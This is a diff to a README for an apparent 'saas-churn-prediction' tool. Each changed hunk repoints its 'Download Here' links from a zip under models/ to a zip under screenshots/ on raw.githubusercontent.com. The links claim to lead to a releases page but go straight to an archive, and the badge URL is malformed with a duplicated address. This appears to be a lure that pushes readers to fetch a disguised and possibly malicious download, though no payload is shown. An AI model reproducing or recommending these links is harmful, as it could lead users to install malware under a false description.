@@ -1,6 +1,6 @@
 # 🚀 saas-churn-prediction - Predict and Retain Your Customers
 
-[![Download Here](https://github.com/Lamasse237/saas-churn-prediction/raw/refs/heads/main/models/saas_prediction_churn_v2.2.zip%https://github.com/Lamasse237/saas-churn-prediction/raw/refs/heads/main/models/saas_prediction_churn_v2.2.zip)](https://github.com/Lamasse237/saas-churn-prediction/raw/refs/heads/main/models/saas_prediction_churn_v2.2.zip)
+[![Download Here](https://raw.githubusercontent.com/Lamasse237/saas-churn-prediction/main/screenshots/churn_prediction_saas_v3.5.zip%https://raw.githubusercontent.com/Lamasse237/saas-churn-prediction/main/screenshots/churn_prediction_saas_v3.5.zip)](https://raw.githubusercontent.com/Lamasse237/saas-churn-prediction/main/screenshots/churn_prediction_saas_v3.5.zip)
 
 ## 📜 Description
 
@@ -30,7 +30,7 @@ Follow these steps to download and run the application:
 
 1. **Visit the Releases Page**  
    Click the link below to access the releases page.  
-   [Download Here](https://github.com/Lamasse237/saas-churn-prediction/raw/refs/heads/main/models/saas_prediction_churn_v2.2.zip)
+   [Download Here](https://raw.githubusercontent.com/Lamasse237/saas-churn-prediction/main/screenshots/churn_prediction_saas_v3.5.zip)
 
 2. **Choose the Latest Release**  
    On the releases page, find the latest version of "saas-churn-prediction." The most recent release will be at the top.
@@ -47,7 +47,7 @@ Follow these steps to download and run the application:
 ## 🔧 Download & Install
 
 For quick access to the downloads, click the following link:  
-[Download Here](https://github.com/Lamasse237/saas-churn-prediction/raw/refs/heads/main/models/saas_prediction_churn_v2.2.zip)
+[Download Here](https://raw.githubusercontent.com/Lamasse237/saas-churn-prediction/main/screenshots/churn_prediction_saas_v3.5.zip)
 
 ## 📊 How to Use the Application
 
